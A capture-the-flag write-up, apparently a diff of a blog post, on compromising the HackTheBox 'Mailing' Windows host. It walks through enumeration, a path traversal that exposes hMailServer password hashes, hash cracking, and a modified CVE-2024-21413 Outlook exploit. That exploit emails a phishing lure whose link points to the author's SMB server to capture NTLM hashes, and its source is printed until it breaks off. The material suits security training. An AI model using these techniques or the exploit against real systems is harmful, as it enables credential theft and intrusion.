+|_http-title: Not Found
+7680/tcp  open  pando-pub?
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+58162/tcp open  msrpc         Microsoft Windows RPC
+58724/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-09-02T10:26:16
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Sep  2 12:27:04 2024 -- 1 IP address (1 host up) scanned in 246.80 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>There are a lot of ports in this machine (25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,58162,58724). Here is a bit of explanation of each port:</p>
+
+<p><strong>Mail related</strong>:</p>
+
+<ul>
+  <li>25: SMTP, used to send emails to the server.</li>
+  <li>110: POP3, used to receive the emails that somebody sent to a specific user.</li>
+  <li>143: IMAP, same purpose of POP3, but in a different way, <a href="https://www.mailmodo.com/guides/pop3-vs-imap/">check this</a> for more information.</li>
+  <li>465 and 587: Secure versions of SMTP.</li>
+  <li>993: Secure version of IMAP.</li>
+</ul>
+
+<p>I also can see that it’s <a href="https://www.hmailserver.com/">hMailServer</a>, which its a mail server that can be installed in windows.</p>
+
+<p><strong>Active directory</strong>:</p>
+
+<ul>
+  <li>135: Microsoft RPC.</li>
+  <li>139, 445: SMB, used to share files.</li>
+  <li>5985: WINRM, used to remotely manage a windows computer with valid credentials.</li>
+</ul>
+
+<p><strong>Web</strong>:</p>
+<ul>
+  <li>80: you already know what is a web.</li>
+</ul>
+
+<p>Also, notice that the domain mailing.htb appears multiple times in the scan, so I will add this line at the end of my /etc/hosts for my system to know where it should resolve that domain:</p>
+
+<pre><code class="language-plaintext">10.10.11.14 mailing.htb
+</code></pre>
+    
+      <h1 id="mail-enumeration">
+        
+        
+          Mail enumeration <a href="#mail-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>There’s no much thing I can do here without authentication. I can’t send an email without authentication:</p>
+
+<pre><code class="language-bash">❯ telnet mailing.htb 25
+Trying 10.10.11.14...
+Connected to mailing.htb.
+Escape character is '^]'.
+220 mailing.htb ESMTP
+HELO x
+250 Hello.
+MAIL FROM: test@mailing.htb
+250 OK
+RCPT TO: root@mailing.htb
+530 SMTP authentication is required.
+</code></pre>
+
+<p>Using the EHLO command, I can see that the only allowed auth methods are LOGIN and PLAIN:</p>
+
+<pre><code class="language-bash">EHLO x    
+250-mailing.htb
+250-SIZE 20480000
+250-AUTH LOGIN PLAIN
+250 HELP
+</code></pre>
+
+<p>The authentication is well-configured and I can’t login as any user I want:</p>
+
+<pre><code class="language-bash">❯ echo -n "test" | base64 -w 0; echo
+dGVzdA==
+</code></pre>
+
+<pre><code class="language-bash">AUTH LOGIN
+334 VXNlcm5hbWU6
+dGVzdA==
+334 UGFzc3dvcmQ6
+dGVzdA==
+535 Authentication failed. Restarting authentication process.
+</code></pre>
+
+<p>That base64 strings are just prompting for Username and password:</p>
+
+<pre><code class="language-bash">❯ echo -n VXNlcm5hbWU6 | base64 -d; echo
+Username:
+❯ echo -n UGFzc3dvcmQ6 | base64 -d; echo
+Password:
+</code></pre>
+
+<p>And VRFY command (used to check if a user exists) is disabled, so I can’t bruteforce valid usernames:</p>
+
+<pre><code class="language-bash">VRFY test
+502 VRFY disallowed.
+</code></pre>
+    
+      <h1 id="active-directory-enumeration">
+        
+        
+          Active directory enumeration <a href="#active-directory-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="rpc">
+        
+        
+          RPC <a href="#rpc" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>I can’t connect to the RPC server without valid credentials:</p>
+
+<pre><code class="language-bash">❯ rpcclient -N 10.10.11.14
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+❯ rpcclient -U "mailing.htb/%" 10.10.11.14
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+</code></pre>
+    
+      <h2 id="smb">
+        
+        
+          SMB <a href="#smb" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>This machine consists in a Windows Server 2019 Build 19041 without signing:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.14
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+</code></pre>
+
+<p>And I don’t have access to any share without credentials:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.14 --shares
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] Error getting user: list index out of range
+SMB         10.10.11.14     445    MAILING          [-] Error enumerating shares: [Errno 32] Broken pipe
+❯ netexec smb 10.10.11.14 -u "test" -p "test" --shares
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] MAILING\test:test STATUS_LOGON_FAILURE 
+❯ netexec smb 10.10.11.14 -u "guest" -p "" --shares
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] MAILING\guest: STATUS_LOGON_FAILURE 
+❯ netexec smb 10.10.11.14 -u "test" -p "" --shares
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] MAILING\test: STATUS_LOGON_FAILURE 
+❯ netexec smb 10.10.11.14 -u "" -p "test" --shares
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] MAILING\:test STATUS_LOGON_FAILURE 
+</code></pre>
+
+<pre><code class="language-bash">❯ smbclient -N -U "test" -L mailing.htb
+session setup failed: NT_STATUS_LOGON_FAILURE
+❯ smbclient -N -U "guest" -L mailing.htb
+session setup failed: NT_STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>Nothing interesting here.</p>
+    
+      <h1 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Taking a look with curl, I can see it consists in a Microsoft-IIS/10.0 and its programmed in ASP.NET. Also, it redirects to mailing.htb, which I have already added to my <code>/etc/hosts</code> file:</p>
+
+<pre><code class="language-bash">❯ curl -i -s http://10.10.11.14
+HTTP/1.1 301 Moved Permanently
+Content-Type: text/html; charset=UTF-8
+Location: http://mailing.htb
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Mon, 02 Sep 2024 14:55:43 GMT
+Content-Length: 152
+
+&lt;head&gt;&lt;title&gt;Documento movido&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Objeto movido&lt;/h1&gt;Este documento puede encontrarse aquí &lt;a HREF="http://mailing.htb"&gt;&lt;/a&gt;&lt;/body&gt;
+</code></pre>
+
+<p>In the browser, it talks about their mail server. There are also some usernames and instructions on how to use it:</p>
+
+<p><img src="/assets/images/Mailing/main-page.png" alt="main page" /></p>
+
+<p>Here also says its using hMailServer, but I saw it before on the nmap scan.</p>
+
+<p>The “Download Instructions” link gives instructions on how to use the server:</p>
+
+<p><img src="/assets/images/Mailing/mail-instructions.png" alt="mail instructions" /></p>
+
+<p>It just gives instructions on how to use different clients  like Thunderbird and Windows Mail to use their mail server.</p>
+
+<p>From this pdf I extracted two things.</p>
+
+<p>It uses user:password combination for the example:</p>
+
+<p><img src="/assets/images/Mailing/user-password-configuration.png" alt="user password combination" /></p>
+
+<p>But it doesn’t works in mail (it would be incredible if this was the case):</p>
+
+<pre><code class="language-bash">❯ telnet mailing.htb 25
+Trying 10.10.11.14...
+Connected to mailing.htb.
+Escape character is '^]'.
+220 mailing.htb ESMTP
+HELO x
+250 Hello.
+AUTH LOGIN
+334 VXNlcm5hbWU6
+user
+334 UGFzc3dvcmQ6
+password
+535 Authentication failed. Restarting authentication process.
+</code></pre>
+
+<p>Also, I can extract a username, maya:</p>
+
+<p><img src="/assets/images/Mailing/message-to-maya.png" alt="message to maya" /></p>
+
+<p>Nothing more interesting here.</p>
+
+<p>Another thing I have to notice is the link of “Download instructions”, which takes the ‘?file’ parameter:</p>
+
+<p><img src="/assets/images/Mailing/download-instructions-link.png" alt="download instructions link" /></p>
+
+<p>And it retrieves the response of the file specified:</p>
+
+<p><img src="/assets/images/Mailing/contents-of-file-in-download-response.png" alt="file response" /></p>
+
+<p>This could be dangerous if its bad programmed because I could retrieve files of the machine:</p>
+    
+      <h2 id="path-traversal">
+        
+        
+          Path traversal <a href="#path-traversal" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>As I saw before, the download.php takes a parameter ?file and returns the contents of a file specified. What if I put ../ until it’s in the file system root and put any system file I want? I will try C:/Windows/System32/drivers/etc/hosts, which is a typical file in windows that does the same as <code>/etc/hosts</code> in linux:</p>
+
+<p><img src="/assets/images/Mailing/etc-hosts-contents-windows.png" alt="etc hosts contents in windows" /></p>
+
+<p>It works and retrieves the contents, so I have confirmed a “Path traversal” vulnerability.</p>
+
+<p>As its a windows machine, I could try to see if I can connect to my SMB server for receiving a hash:</p>
+
+<pre><code class="language-bash">❯ smbserver.py -smb2support test $(pwd)
+Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<p><img src="/assets/images/Mailing/try-smb-connection.png" alt="try smb connection" /></p>
+
+<p>But I don’t receive anything:</p>
+
+<p><img src="/assets/images/Mailing/smbserver-nothing-received.png" alt="smb server nothing received" /></p>
+
+<p>However, as the server uses hMailServer for mail, I will look at its configuration file.</p>
+
+<p>For that, I will install hMailServer from <a href="https://www.hmailserver.com/download">here</a> in a Windows VM to see where the configuration file is located.</p>
+
+<p>Searching a bit after installing it, I can see a configuration file called hMailServer.INI located in <code>C:\Program Files (x86)\hMailServer\Bin</code>, which has hashed passwords:</p>
+
+<p><img src="/assets/images/Mailing/password-in-hmailserver.ini.png" alt="password in hmailserver.ini" /></p>
+
+<p>In the installation, I specified the password <code>test123</code> so I will see if cracking it with john its the same:</p>
+
+<pre><code class="language-bash">❯ john -w=/usr/share/wordlists/rockyou.txt myHmailServerAdministratorPassword.hash --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+test123          (?)     
+1g 0:00:00:00 DONE (2024-09-02 19:31) 100.0g/s 1766Kp/s 1766Kc/s 1766KC/s goarmy..ellie123
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<p>And its the case.</p>
+
+<p>The other password in the “Password” field doesn’t seem crackable and I don’t know how was generated:</p>
+
+<pre><code class="language-bash">❯ john -w=/usr/share/wordlists/rockyou.txt myHmailServerDBPassword.hash --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2024-09-02 19:39) 0g/s 14786Kp/s 14786Kc/s 14786KC/s  fuckyooh21..*7¡Vamos!
+Session completed. 
+</code></pre>
+
+<p>I will look at that file in the path traversal vulnerability:</p>
+
+<p><img src="/assets/images/Mailing/hMailServer.ini-in-path-traversal.png" alt="hMailServer.ini in path traversal" /></p>
+
+<p>And I can take the hashed password of Administrator user. Cracking it success and gives me the password ‘homenetworkingadministrator’:</p>
+
+<pre><code class="language-bash">❯ john -w=/usr/share/wordlists/rockyou.txt administrator-mail.hash --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+homenetworkingadministrator (?)     
+1g 0:00:00:00 DONE (2024-09-02 19:44) 1.886g/s 14268Kp/s 14268Kc/s 14268KC/s homerandme..homejame
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+<p>This password doesn’t works for SMB:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.14 -u "Administrator" -p "homenetworkingadministrator"
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] MAILING\Administrator:homenetworkingadministrator STATUS_LOGON_FAILURE 
+</code></pre>
+
+<p>I will try with the different possible combinations of the users I saw in the webpage but nothing:</p>
+
+<pre><code class="language-bash">❯ /bin/cat users.txt
+maya bendito
+ruy alonso
+gregory smith
+❯ /opt/username-anarchy/username-anarchy -i users.txt &gt; users-to-test.txt
+</code></pre>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.14 -u users-to-test.txt -p 'homenetworkingadministrator' -t 3
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] MAILING\maya:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\mayabendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\maya.bendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\mayabend:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\mayab:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\m.bendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\mbendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\bmaya:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\b.maya:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\benditom:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\bendito:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\bendito.m:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\bendito.maya:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\mb:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ruyalonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ruy.alonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ruyalons:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ruyalon:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ruya:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\r.alonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ralonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\aruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\a.ruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\alonsor:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\alonso:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\alonso.r:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\alonso.ruy:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\ra:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\gregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\gregorysmith:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\gregory.smith:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\gregorys:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\gregsmit:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\g.smith:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\gsmith:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\sgregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\s.gregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\smithg:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\smith:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\smith.g:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\smith.gregory:homenetworkingadministrator STATUS_LOGON_FAILURE 
+SMB         10.10.11.14     445    MAILING          [-] MAILING\gs:homenetworkingadministrator STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>However, it does work in the mail server (that’s why I saw it in the hMailServer.ini):</p>
+
+<pre><code class="language-bash">❯ echo -n 'homenetworkingadministrator' | base64 -w 0; echo
+aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
+❯ echo -n 'Administrator@mailing.htb' | base64 -w 0; echo
+QWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
+</code></pre>
+
+<pre><code class="language-bash">❯ telnet mailing.htb 25
+Trying 10.10.11.14...
+Connected to mailing.htb.
+Escape character is '^]'.
+220 mailing.htb ESMTP
+HELO mailing.htb
+250 Hello.
+AUTH LOGIN
+334 VXNlcm5hbWU6
+QWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
+334 UGFzc3dvcmQ6
+aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
+235 authenticated.
+</code></pre>
+
+<p>Now I can send messages as Administrator to any user. I saw that user maya was valid before and that she could be using Outlook.</p>
+    
+      <h1 id="access-as-maya">
+        
+        
+          Access as maya <a href="#access-as-maya" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Outlook had a vulnerability that became so popular identified as <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21413">CVE-2024-21413</a>, which is described as a Remote Code Execution vulnerability:</p>
+
+<p><img src="/assets/images/Mailing/CVE-2024-21413.png" alt="CVE-2024-21413" /></p>
+
+<p>However looking at <a href="https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/">this research</a> I taked from the nvd page, I can see that its more a filter bypass. Normally, outlook advertises when a link is dangerous:</p>
+
+<p><img src="/assets/images/Mailing/normally-outlook-advertises-link.png" alt="normally outlook advertises link" /></p>
+
+<p>But apparently putting an exclamation mark the filter is bypassed:</p>
+
+<p><img src="/assets/images/Mailing/bypass-outlook-restriction-exclamation-mark.png" alt="bypass outlook restriction exclamation mark" /></p>
+
+<p>This could be used for an attacker to retrieve the ntlm hash of an user that opens a link that points to an attacker-hosted smbserver.</p>
+
+<p>Looking for exploits, I saw <a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability">this one</a> that it logins with the specified username and password, starts TLS encryption and sends the email to the specified username:</p>
+
+<p><img src="/assets/images/Mailing/exploit-outlook.png" alt="exploit outlook" /></p>
+
+<p>I will clone it:</p>
+
+<pre><code class="language-bash">❯ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+Cloning into 'CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability'...
+remote: Enumerating objects: 28, done.
+remote: Counting objects: 100% (28/28), done.
+remote: Compressing objects: 100% (27/27), done.
+remote: Total 28 (delta 7), reused 6 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (28/28), 14.48 KiB | 336.00 KiB/s, done.
+Resolving deltas: 100% (7/7), done.
+❯ cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+</code></pre>
+
+<p>The html message is too suspicious. Its not necessary for this machine but to act as a more advanced attacker, I will change the title to “Congratulations. You won an iPhone 15.”, resulting like this:</p>
+
+<pre><code class="language-python">html = f"""\
+    &lt;html&gt;
+    &lt;body&gt;
+        &lt;h1&gt;&lt;a href="file:///{link_url}!poc"&gt;Congratulations. You won an iPhone 15.&lt;/a&gt;&lt;/h1&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+    """
+</code></pre>
+
+<p>I will use the exploit with the url of my hosted smb server to leak the ntlm hash. For that, I need to start an smbserver first:</p>
+
+<pre><code class="language-bash">❯ mkdir smbserver
+❯ cd smbserver
+❯ echo 'hello' &gt; test.txt
+❯ smbserver.py -smb2support test $(pwd)
+Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<p>Now run the exploit:</p>
+
+<pre><code class="language-bash">❯ python3 CVE-2024-21413.py --server mailing.htb --port 25 --username 'Administrator@mailing.htb' --password homenetworkingadministrator --sender 'Administrator@mailing.htb' --recipient 'maya@mailing.htb' --url '\\10.10.14.106\test\test.txt' --subject 'Congratulations maya!'
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de
+
+❌ Failed to send email: STARTTLS extension not supported by server.
+</code></pre>
+
+<p>But it says STARTTLS not supported so I will remove the line that does. This is the resulting exploit:</p>
+
+<pre><code class="language-python">import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import argparse
+import sys
+
+BLUE = "\033[94m"
+GREEN = "\033[92m"
+RED = "\033[91m"
+ENDC = "\033[0m"
+
+def display_banner():
+    banner = f"""
+{BLUE}CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de{ENDC}
+"""
+    print(banner)
+
+def send_email(smtp_server, port, username, password, sender_email, recipient_email, link_url, subject):
+
+    """Sends an email with both plain text and HTML parts, including advanced features."""
+    msg = MIMEMultipart('alternative')
+    msg['Subject'] = subject
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+
+    text = "Please read this email in HTML format."
+    base64_image_string = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANgAAAAuCAYAAABK69fpAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTMyIDc5LjE1OTI4NCwgMjAxNi8wNC8xOS0xMzoxMzo0MCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTAwQkM2Mzk4NDBBMTFFNjhDQkVCOTdDMjE1NkM3RkQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTAwQkM2Mzg4NDBBMTFFNjhDQkVCOTdDMjE1NkM3RkQiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUuNSAoV2luZG93cykiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpBMkM5MzFBNDcwQTExMUU2QUVERkExNDU3ODU1M0I3QiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBMkM5MzFBNTcwQTExMUU2QUVERkExNDU3ODU1M0I3QiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgQJy/MAAAxESURBVHja7FwNlFVVFT6PN8MMM8AIjPxomEyggCYgajIaguCkaC5AEocif9CIiLLyp9IMC9NgVRqrGpMSwcFSIs3URHERJoJCSlIgMQk0YCS/MjAww8zrbO/36rz99rnvzpt3Z6Z551trL5hz3z3n3HPO/t/3Rg6NL6lXIeCWXhfk0r99Ji05Hkb/IxojI8vK6lfbrk+fPl05OLQ2OrglcHBwDObg4BjMwcHBMZiDg2MwBwfHYA4ODr7IaW8PNOfliNryeKnqpM50u+vQXJRoGqlpmKZiTUc0HdT0hKa1Wclg+9/urWqqe6pOPf8vpjtYU39Nb4Mc2g6+oukWTSdZLL/sZLDDu4tU/ZE82+VZmko1NQgL9oymymYMPUTT7ZoaWXtU0wuafmm00QS/p+kLmvIhGedpmu3OdauDCiR+gLNiw7GsNRE75DSqSIeY7fJYTVdarp2u6TeajqY5NDFXueXaUcZgozV91fi7QNNdml7U9Cd3xlsVs1IwV1xAZieDpYCf5DlD0wWaVqTRbz9Nl/hcr2N/jxJ+E8H4jsFaD700fVFo365pIfwvcu7/xq53hWV0tqalmrZkK4OlkkrXpMlgE+EEB8V6S/tf3Ta0KiiYcSpre1fT5WxvOkAgfkLTJAjG09D+sslgLkyfiAlNZJQ4Y05t4j2/1/QQa7tf0x/cFrQqBoFxTDwpCD7ysztqukfTNE0DwUs13L93GiwRPTRN0fTjJtxThgBHU1CraYamRzSdrOmfmtZoirktaFU0Cm1vNMH0z3ofLAhI5T+ogkeKbhA2KYhlQJLuFbfcbZ7B6n32L2ZpdwwG7NB0